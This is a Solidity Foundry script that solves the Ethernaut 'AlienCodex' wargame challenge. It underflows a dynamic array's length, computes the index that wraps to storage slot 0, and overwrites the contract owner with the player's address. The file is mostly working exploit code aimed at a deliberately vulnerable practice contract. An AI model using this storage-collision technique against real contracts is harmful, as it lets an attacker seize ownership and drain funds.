// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
    function owner() external view returns (address);
}

/**
 * @title Challenge 19 Solution Script
 * @notice Exploit array length underflow to overwrite owner via storage collision
 */
contract AlienCodexSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0x017eEF20307984E6a01c56d84F7690bCd1eE9604;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        IAlienCodex target = IAlienCodex(INSTANCE);

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: Make contact (required by modifier)
        target.makeContact();

        // Step 2: Retract to underflow array length to 2^256 - 1
        target.retract();

        // Step 3: Calculate index i such that codex[i] maps to storage slot 0 (owner)
        // codex[i] is at slot: keccak256(1) + i
        // We need: keccak256(1) + i = 0 (mod 2^256)
        // So: i = 2^256 - keccak256(1)
        bytes32 codexStart = keccak256(abi.encode(uint256(1)));
        uint256 i = type(uint256).max - uint256(codexStart) + 1;

        // Step 4: Write player address to slot 0
        target.revise(i, bytes32(uint256(uint160(player))));

        vm.stopBroadcast();

        console.log("Owner:", target.owner());
        console.log("Challenge 19 completed!");
    }
}
